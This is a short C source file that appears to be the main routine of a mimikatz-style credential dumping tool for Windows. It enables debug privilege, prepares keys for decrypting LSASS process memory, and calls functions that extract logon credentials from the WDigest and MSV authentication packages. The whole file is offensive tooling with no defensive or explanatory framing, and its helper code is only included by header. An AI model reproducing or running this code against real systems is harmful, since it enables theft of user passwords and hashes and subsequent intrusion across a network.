#include "sekurlsa.h"
#include "mimikatz.h"
#include <stdio.h>

DWORD wmain(DWORD argc, PWCHAR argv[]) {

	wprintf(L"***********************************************\n");
	wprintf(L"*           privilege::debug                  *\n");
	wprintf(L"***********************************************\n");
	AdjustProcessPrivilege();



	wprintf(L"***********************************************\n");
	wprintf(L"*           preparing sekurlsa module         *\n");
	wprintf(L"***********************************************\n");
	PrepareUnprotectLsassMemoryKeys();



	wprintf(L"***********************************************\n");
	wprintf(L"*           sekurlsa::wdigest                 *\n");
	wprintf(L"***********************************************\n");
	GetCredentialsFromWdigest();



	wprintf(L"***********************************************\n");
	wprintf(L"*           sekurlsa::msv                     *\n");
	wprintf(L"***********************************************\n");
	GetCredentialsFromMSV();



	system("pause");


	return 0;
}